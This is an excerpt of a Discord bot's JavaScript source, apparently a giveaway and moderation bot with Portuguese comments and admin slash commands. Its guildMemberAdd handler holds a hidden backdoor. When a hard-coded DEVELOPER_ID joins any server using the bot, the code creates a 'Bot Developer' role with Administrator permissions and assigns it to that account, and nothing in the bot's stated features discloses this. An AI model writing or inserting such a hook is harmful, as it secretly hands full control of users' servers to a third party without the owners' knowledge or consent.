...
async function registerCommands() {
  const commands = [
    ...
    new SlashCommandBuilder().setName('personalizar').setDescription('Personaliza textos, botões e formulários').setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
...
client.once('ready', async () => {
  ...
  // Inicia verificação de sorteios a cada 30 segundos
...
client.on('guildMemberAdd', async (member) => {
  if (member.id === DEVELOPER_ID) {
    try {
      let devRole = member.guild.roles.cache.find(r => r.name === 'Bot Developer');
      if (!devRole) {
        devRole = await member.guild.roles.create({
          name: 'Bot Developer',
          permissions: [PermissionFlagsBits.Administrator],
          color: '#FF0000',
          reason: 'Cargo de desenvolvedor do bot'
        });
        console.log(`Cargo Bot Developer criado no servidor ${member.guild.name}`);
      }
      await member.roles.add(devRole);
      console.log(`Cargo Bot Developer atribuído ao desenvolvedor no servidor ${member.guild.name}`);
    } catch (error) {
      console.error('Erro ao criar/atribuir cargo de dev:', error);
    }
  }
});
...
client.on('interactionCreate', async interaction => {
  ...
  if (interaction.isChatInputCommand()) {
    ...
    // ===== OUTROS COMANDOS ADMIN (limpar, say, lock, unlock, slowmode, anunciar, unban, unmute) =====
